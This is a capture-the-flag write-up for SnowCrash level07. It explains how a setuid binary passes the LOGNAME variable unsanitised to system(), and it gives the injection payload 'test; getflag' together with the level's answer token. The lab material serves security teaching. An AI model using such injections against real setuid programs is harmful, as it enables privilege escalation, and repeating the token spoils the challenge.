# Level07 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Exploit LOGNAME environment variable injection in a setuid binary to retrieve the flag07 token.

## Vulnerability
Unsanitized environment variable `LOGNAME` passed to shell command execution via `system()`.

## Binary Analysis
The setuid binary reads the `LOGNAME` environment variable and passes it directly to:
```c
asprintf(&format, "/bin/echo %s", getenv("LOGNAME"));
system(format);
```

## The Problem

1. **Environment Variable Read**: Binary gets `LOGNAME` via `getenv()`
2. **No Sanitization**: Input not filtered or escaped
3. **Shell Execution**: String passed to `system()` which invokes `/bin/sh`
4. **Command Injection**: Shell metacharacters (`;`, `|`, `&`) interpreted

## Exploitation

### Command Injection
```bash
LOGNAME='test; getflag' ./level07
```

This executes as flag07 (setuid privileges) and runs:
```bash
/bin/echo test
getflag
```

The semicolon terminates the echo command and executes getflag.

## Result
```
test
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Security Flaws

1. **Environment Variable Injection**: LOGNAME not validated
2. **system() Misuse**: Shell interpretation enabled
3. **Setuid Amplification**: Executes with flag07 privileges
4. **No Input Validation**: Any shell metacharacters work


## Answer

**Level07 Token**: `fiumuikeil55xe9cu4dood66h`
**Vulnerability**: LOGNAME environment variable command injection
**Impact**: Arbitrary command execution as flag07 via unsanitized system() call
